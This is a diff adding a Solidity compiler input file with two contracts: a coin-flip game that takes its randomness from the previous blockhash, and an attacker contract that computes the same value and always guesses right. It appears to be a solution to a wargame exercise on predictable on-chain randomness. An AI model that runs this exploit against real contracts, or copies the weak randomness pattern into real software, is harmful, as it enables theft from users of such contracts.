@@ -1,0 +1,39 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/CoinFlip.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract CoinFlip {\n    uint256 public consecutiveWins;\n    uint256 lastHash;\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    constructor() {\n        consecutiveWins = 0;\n    }\n\n    function flip(bool _guess) public returns (bool) {\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n\n        if (lastHash == blockValue) {\n            revert(\"Same Block\");\n        }\n\n        lastHash = blockValue;\n        uint256 coinFlip = blockValue / FACTOR;\n        bool side = coinFlip == 1 ? true : false;\n\n        if (side == _guess) {\n            consecutiveWins++;\n            return true;\n        } else {\n            consecutiveWins = 0;\n            return false;\n        }\n    }\n}"
+    },
+    "contracts/CoinFlipAttacker.sol": {
+      "content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\nimport {CoinFlip} from \"./CoinFlip.sol\";\r\n\r\ncontract CoinFlipAttacker {\r\n    uint256 public consecutiveWins;\r\n    uint256 lastHash;\r\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n\r\n    address public targetAddress;\r\n\r\n    CoinFlip target;\r\n\r\n    constructor() {\r\n        \r\n    }\r\n\r\n    function setTarget(address _targetaddress) public {\r\n        targetAddress = _targetaddress;\r\n        target = CoinFlip(targetAddress);\r\n        consecutiveWins = 0 ;\r\n    }\r\n\r\n    function flipAttack() public returns (bool) {\r\n        uint256 blockValue = uint256(blockhash(block.number - 1));\r\n\r\n        if (lastHash == blockValue) {\r\n            revert(\"Same Block\");\r\n        }\r\n\r\n        lastHash = blockValue;\r\n        uint256 coinFlip = blockValue / FACTOR;\r\n        bool side = coinFlip == 1 ? true : false;\r\n\r\n        bool result = target.flip(side);\r\n        if (result) {\r\n            consecutiveWins++;\r\n        }\r\n\r\n        return result;\r\n    }\r\n}"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "evmVersion": "paris",
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
